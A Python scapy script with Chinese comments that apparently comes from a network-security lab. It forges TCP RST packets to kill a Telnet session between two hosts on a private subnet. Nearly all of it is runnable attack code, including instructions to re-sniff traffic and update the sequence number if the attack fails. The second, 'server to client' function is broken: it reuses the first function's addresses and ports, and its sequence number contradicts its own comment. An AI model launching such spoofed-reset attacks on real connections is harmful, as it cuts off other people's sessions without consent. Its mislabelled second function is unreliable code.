#!/usr/bin/env python3
"""
TCP RST 攻击脚本 (手动模式)
根据Wireshark抓包结果精确配置参数
"""
from scapy.all import IP, TCP, send

def attack_client_to_server():
    """伪造客户端(10.9.0.6)发送RST给服务器(10.9.0.5)"""
    print("[*] 构造 客户端 -> 服务器 的RST包...")
    # ==== 根据你的Wireshark结果修改以下参数 ====
    src_ip = "10.9.0.6"       # 伪造包的源IP (连接发起方)
    dst_ip = "10.9.0.5"       # 伪造包的目标IP (服务端)
    sport = 46614             # 客户端使用的源端口 (你的抓包中是 46614)
    dport = 23                # 目标端口 (Telnet)
    # 最关键参数：seq 应该是服务器期望从客户端收到的下一个序列号
    # 取【服务器发给客户端】的包中的 Ack 字段值 (例如 Frame 4462 中的 Ack: 102841062)
    seq_num = 102841062
    # =========================================
    
    ip = IP(src=src_ip, dst=dst_ip)
    tcp = TCP(sport=sport, dport=dport, flags="R", seq=seq_num)
    pkt = ip / tcp
    
    print(f"    源: {src_ip}:{sport}")
    print(f"    目标: {dst_ip}:{dport}")
    print(f"    设置 RST 标志, seq={seq_num}")
    send(pkt, verbose=1)
    print("[+] 客户端->服务器 RST包发送完成.\n")

def attack_server_to_client():
    """伪造服务器(10.9.0.5)发送RST给客户端(10.9.0.6)"""
    print("[*] 构造 服务器 -> 客户端 的RST包...")
    # ==== 根据你的Wireshark结果修改以下参数 ====
    src_ip = "10.9.0.6"       # 伪造包的源IP (服务器)
    dst_ip = "10.9.0.5"       # 伪造包的目标IP (客户端)
    sport = 46614               # 源端口 (服务器Telnet端口)
    dport = 23            # 目标端口 (客户端端口，你的抓包中是 46614)
    # 最关键参数：seq 应该是客户端期望从服务器收到的下一个序列号
    # 可以取【客户端发给服务器】的包中的 Ack 字段值 (例如 Frame 4460 中的 Ack: 804150704)，然后加上该包的负载长度
    # 更精确的做法：取服务器已发送序列号 + 最新负载长度，例如 804150704 + 2 = 804150706
    seq_num = 102841060
    # =========================================
    
    ip = IP(src=src_ip, dst=dst_ip)
    tcp = TCP(sport=sport, dport=dport, flags="R", seq=seq_num)
    pkt = ip / tcp
    
    print(f"    源: {src_ip}:{sport}")
    print(f"    目标: {dst_ip}:{dport}")
    print(f"    设置 RST 标志, seq={seq_num}")
    send(pkt, verbose=1)
    print("[+] 服务器->客户端 RST包发送完成.\n")

def main():
    print("=" * 50)
    print("        TCP RST 手动攻击脚本")
    print("=" * 50)
    
    # 建议同时发送两个方向的RST，确保连接被终止
    attack_client_to_server()
    attack_server_to_client()
    
    print("[!] 攻击完成。请立即检查目标Telnet会话是否已断开。")
    print("[提示] 如果连接仍在，请重新捕获最新流量，并更新脚本中的 seq_num。")

if __name__ == "__main__":
    main()